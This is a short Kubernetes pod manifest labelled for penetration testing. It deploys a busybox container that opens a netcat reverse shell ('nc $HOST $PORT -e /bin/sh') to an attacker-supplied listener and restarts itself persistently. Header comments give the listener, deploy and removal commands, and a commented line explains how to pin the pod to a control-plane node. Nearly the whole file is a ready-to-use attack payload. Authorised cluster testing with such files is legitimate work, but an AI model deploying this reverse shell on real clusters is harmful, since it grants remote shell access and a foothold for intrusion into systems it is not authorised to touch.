###########################################################
## Set up Listener: nc -nvlp 3116
## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < nothing-allowed-revshell-pod.yaml | kubectl apply -f -
## Remove: kubectl -n [namespace] delete nothing-allowed-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: nothing-allowed-revshell-pod
  labels: 
    app: pentest
spec:
  containers:
  - name: nothing-allowed-revshell-pod
    image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
  restartPolicy: Always